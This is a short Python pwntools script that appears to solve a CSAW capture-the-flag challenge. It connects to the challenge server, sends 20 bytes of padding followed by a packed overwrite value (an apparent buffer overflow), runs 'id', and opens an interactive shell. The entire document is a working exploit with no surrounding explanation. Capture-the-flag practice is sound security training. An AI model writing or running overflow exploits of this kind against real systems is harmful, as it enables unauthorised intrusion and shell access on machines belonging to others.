import struct
from pwn import *

HOST = 'pwn.chal.csaw.io'
PORT = '9000'

log.info('Crafting Exploit')
padding = 'A' * 20 # Creates a padding of 20 bytes
payload = struct.pack('I', 0xcaf3baee) # Sets value to overwrite
exploit = padding + payload
log.info('Exploit Crafted')

p = log.progress('Exploiting target {}:{}'.format(HOST, PORT))
r = remote(HOST, PORT) # Connecting to host
print r.recv()
p.status('Sending Exploit')
r.sendline(exploit) # Sending Exploit
r.sendline('\nid') # Get ID of user
check = r.recv()
p.success('PWNED!')
r.interactive() # Get Shell!
